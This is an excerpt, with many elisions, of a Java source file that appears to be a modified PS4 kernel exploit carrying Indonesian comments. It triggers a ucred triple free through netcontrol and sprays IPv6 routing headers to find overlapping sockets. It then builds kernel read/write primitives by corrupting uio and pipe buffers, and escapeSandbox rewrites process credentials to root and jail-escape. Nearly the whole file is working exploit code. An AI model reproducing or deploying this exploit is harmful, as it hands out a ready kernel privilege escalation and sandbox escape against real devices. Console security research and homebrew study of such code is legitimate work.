...
public class Poops {
    // ==================== CONSTANTS (di-tune seperti modded) ====================
    ...
    private static final int IPV6_SOCK_NUM = 200;        // modded
    private static final int IOV_THREAD_NUM = 8;         // modded
    private static final int UIO_THREAD_NUM = 8;         // modded
    ...
    // Stability timing (modded)
    private static final int YIELD_LOW = 6;
    private static final int YIELD_MEDIUM = 4;
    private static final int YIELD_HIGH = 2;
    private static final int SLEEP_SHORT = 1;
    private static final int SLEEP_MEDIUM = 3;
    private static final int SLEEP_LONG = 8;

    // system methods
    private static long dup, close, read, readv, write, writev, ioctl, fcntl, pipe, kqueue,
                        socket, socketpair, recvmsg, getsockopt, setsockopt, setuid, getpid,
                        sched_yield, cpuset_setaffinity, __sys_netcontrol;
    ...
    private static int uioSs0, uioSs1, iovSs0, iovSs1;
    private static long kl_lock, kq_fdp, fdt_ofiles, allproc;
    ...
    private static int masterRpipeFd, masterWpipeFd, victimRpipeFd, victimWpipeFd;

    // SUCCESSFUL SOCKETS REUSE (dari modded)
    private static List<Integer> successfulSockets = new ArrayList<>();
    ...
    private static void adaptiveYield(int count) {
        for (int i = 0; i < count; i++) sched_yield();
    }
    ...
    private static void hardResetGlobals() {
        twins = new int[2];
        triplets = new int[3];
        uafSock = 0;
    ...
    // ====================== FIND TWINS & TRIPLET (universal modded) ======================
    private static boolean findTwins() {
        for (int attempt = 0; attempt < 2; attempt++) {
            for (int i = 0; i < ipv6Socks.length; i++) freeRthdr(ipv6Socks[i]);
            safeSleep(SLEEP_MEDIUM);
            adaptiveYield(YIELD_MEDIUM);

            for (int i = 0; i < ipv6Socks.length; i++) {
                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }
            safeSleep(SLEEP_SHORT);
            adaptiveYield(YIELD_LOW);
            ...
            for (int i = 0; i < ipv6Socks.length; i++) {
                ...
                if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
                    twins[0] = i;
                    twins[1] = j;
                    console.println("Twins found: [" + i + "][" + j + "]");
                    return true;
                }
            }
            safeSleep(SLEEP_LONG);
        }
    ...
    private static int findTriplet(int master, int other) {
        for (int attempt = 0; attempt < 2; attempt++) {
            ...
            for (int i = 0; i < ipv6Socks.length; i++) {
                ...
                if ((val & 0xFFFF0000) == RTHDR_TAG && (val & 0xFFFF) == master) return i;
            }
            safeSleep(SLEEP_LONG);
        }
        return -1;
    ...
    private static void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
        uio.putLong(0x00, uio_iov);
        uio.putLong(0x08, UIO_IOV_NUM);
        uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL);
        uio.putLong(0x18, size);
        uio.putInt(0x20, UIO_SYSSPACE);
        uio.putInt(0x24, read ? UIO_WRITE : UIO_READ);
        uio.putLong(0x28, uio_td);
        uio.putLong(0x30, addr);
        uio.putLong(0x38, size);
    }

    // ====================== KREADSLOW & KWRITESLOW (LENGKAP) ======================
    private static Buffer kreadSlow(long addr, int size) {
        Buffer[] leakBuffers = new Buffer[UIO_THREAD_NUM];
        for (int i = 0; i < UIO_THREAD_NUM; i++) leakBuffers[i] = new Buffer(size);
        ...
        while (count < 15000) {
            ...
            for (int i = 0; i < UIO_THREAD_NUM; i++) read(uioSs0, leakBuffers[i], size);
    ...
    private static boolean kwriteSlow(long addr, Buffer buffer) {
        ...
        while (count < 15000) {
            ...
            for (int i = 0; i < UIO_THREAD_NUM; i++) write(uioSs1, buffer, buffer.size());
            uioState.waitForFinished();
        }
        ...
        triplets[1] = findTriplet(triplets[0], -1);
        if (triplets[1] == -1) return false;

        uioState.waitForFinished();
        write(iovSs1, tmp, Int8.SIZE);

        triplets[2] = findTriplet(triplets[0], triplets[1]);
        if (triplets[2] == -1) return false;
    ...
    private static long kreadSlow64(long address) {
        Buffer buf = kreadSlow(address, Int64.SIZE);
        return (buf != null) ? buf.getLong(0x00) : 0;
    }

    // ====================== HELPER KERNEL RW ======================
    private static void fhold(long fp) {
        kwrite32(fp + 0x28, kread32(fp + 0x28) + 1);
    }
    ...
    private static void removeRthrFromSocket(int fd) {
        ...
        kwrite64(in6p_outputopts + 0x68, 0);
    }
    ...
    private static int corruptPipebuf(int cnt, int in, int out, int size, long buffer) {
        ...
        victimPipebuf.putInt(0x00, cnt);
        victimPipebuf.putInt(0x04, in);
        victimPipebuf.putInt(0x08, out);
        victimPipebuf.putInt(0x0C, size);
        victimPipebuf.putLong(0x10, buffer);
    ...
    private static boolean achieveRw(int timeout) {
        try {
            ...
            while (timeout-- != 0) {
                ...
                getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
                if (leakRthdr.getLong(0x08) == 0x1430000L && leakRthdr.getLong(0x98) != 0) break;
                close(kq);
                safeSleep(SLEEP_SHORT);
            }
            ...
            long masterRpipeData = kreadSlow64(masterRpipeFile);
            long victimRpipeData = kreadSlow64(victimRpipeFile);

            Buffer masterPipebuf = new Buffer(PIPEBUF_SIZE);
            masterPipebuf.putInt(0x00, 0);
            masterPipebuf.putInt(0x04, 0);
            masterPipebuf.putInt(0x08, 0);
            masterPipebuf.putInt(0x0C, PAGE_SIZE);
            masterPipebuf.putLong(0x10, victimRpipeData);

            if (!kwriteSlow(masterRpipeData, masterPipebuf)) return false;
            ...
            for (int fd : triplets) removeRthrFromSocket(ipv6Socks[fd]);
            removeUafFile();

            return true;
        } catch (Exception e) {
            console.println("exception in achieveRw");
            return false;
        }
    }
    ...
    private static boolean escapeSandbox() {
        ...
        kwrite32(ucred + 0x04, 0);
        kwrite32(ucred + 0x08, 0);
        kwrite32(ucred + 0x0C, 0);
        kwrite32(ucred + 0x10, 1);
        kwrite32(ucred + 0x14, 0);
        kwrite64(ucred + 0x30, kread64(kread64(kread64(curproc + 0x40) + 0x30))); // prison0
        kwrite64(ucred + 0x60, -1L);
        kwrite64(ucred + 0x68, -1L);

        long rootvnode = kread64(kread64(curproc + 0x48) + 0x10);
        kwrite64(procFd + 0x10, rootvnode);
        kwrite64(procFd + 0x18, rootvnode);

        return true;
    }

    // ====================== KERNEL PATCHES (tetap seperti lama) ======================
    ...
    // ====================== TRIGGER U CRED TRIPLE FREE (dengan successfulSockets) ======================
    private static boolean triggerUcredTripleFree() {
        try {
            Buffer setBuf = new Buffer(8);
            Buffer clearBuf = new Buffer(8);

            msgIov.putLong(0x00, 1);
            msgIov.putLong(0x08, Int8.SIZE);

            int dummySock = (!successfulSockets.isEmpty() && successfulSockets.size() % 2 == 0)
                    ? successfulSockets.remove(successfulSockets.size() - 1)
                    : socket(AF_UNIX, SOCK_STREAM, 0);

            setBuf.putInt(0x00, dummySock);
            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
            successfulSockets.add(dummySock);
            close(dummySock);
            ...
            console.println("Triple free OK");
            return true;
        } catch (Exception e) {
            console.println("Exception in triple free");
            return false;
        }
    }
    ...
    public static boolean performSetup() {
        try {
            ...
            if (cpusetSetAffinity(5) != 0) return false;
            if (!Helper.setRealtimePriority(256)) return false;

            socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
            uioSs0 = uioSs.get(0); uioSs1 = uioSs.get(1);
            socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
            iovSs0 = iovSs.get(0); iovSs1 = iovSs.get(1);
            ...
            for (int i = 0; i < ipv6Socks.length; i++) ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
            for (int i = 0; i < ipv6Socks.length; i++) freeRthdr(ipv6Socks[i]);

            pipe(masterPipeFd); pipe(victimPipeFd);
            masterRpipeFd = masterPipeFd.get(0); masterWpipeFd = masterPipeFd.get(1);
            victimRpipeFd = victimPipeFd.get(0); victimWpipeFd = victimPipeFd.get(1);
    ...
    public static void cleanup() {
        for (int fd : successfulSockets) if (fd > 0) close(fd);
        successfulSockets.clear();

        for (int i = 0; i < ipv6Socks.length; i++) if (ipv6Socks[i] > 0) close(ipv6Socks[i]);
        close(uioSs1); close(uioSs0); close(iovSs1); close(iovSs0);
        close(masterRpipeFd); close(masterWpipeFd);
        close(victimRpipeFd); close(victimWpipeFd);

        for (int i = 0; i < IOV_THREAD_NUM; i++) if (iovThreads[i] != null) {
            iovThreads[i].interrupt(); try { iovThreads[i].join(500); } catch (Exception ignored) {}
        }
        for (int i = 0; i < UIO_THREAD_NUM; i++) if (uioThreads[i] != null) {
            uioThreads[i].interrupt(); try { uioThreads[i].join(500); } catch (Exception ignored) {}
        }
    ...
    public static int main(PrintStream cons) {
        ...
        console.println("Initial triple free\nJika diam > 30 detik → Restart PS4");

        for (int attempt = 0; attempt < 2; attempt++) {
            hardResetGlobals();
            if (triggerUcredTripleFree()) break;
            safeSleep(2000);
            console.println("Retry triple free (" + (attempt + 1) + "/2)");
        }
        ...
        public void run() {
            ...
            try {
                while (true) {
                    ...
                    if (command == COMMAND_UIO_READ) writev(uioSs1, uioIovRead, UIO_IOV_NUM);
                    else if (command == COMMAND_UIO_WRITE) readv(uioSs0, uioIovWrite, UIO_IOV_NUM);
                    state.signalFinished();
                }
            } catch (InterruptedException e) {}
        }
    ...
    static class WorkerState {
        ...
        public WorkerState(int totalWorkers) { this.totalWorkers = totalWorkers; }
        ...
        public synchronized int waitForWork() throws InterruptedException {
            while (workCommand == -1 || workersFinishedWork != 0) wait();
            workersStartedWork++;
            if (workersStartedWork == totalWorkers) notifyAll();
            return workCommand;
        }

        public synchronized void signalFinished() {
            workersFinishedWork++;
            if (workersFinishedWork == totalWorkers) notifyAll();
        }
    }

    // Helper methods yang dibutuhkan (buildRthdr, freeRthdr, setRthdr, getRthdr, cpusetSetAffinity)
    private static int buildRthdr(Buffer buf, int size) {
        int len = ((size >> 3) - 1) & ~1;
        buf.putByte(0x00, (byte) 0);
        buf.putByte(0x01, (byte) len);
        buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0);
        buf.putByte(0x03, (byte) (len >> 1));
        return (len + 1) << 3;
    }
    ...
    private static int cpusetSetAffinity(int core) {
        ...
        return (int) api.call(cpuset_setaffinity, 3, 1, 0xFFFFFFFFFFFFFFFFL, 0x10, mask.address());
    }
}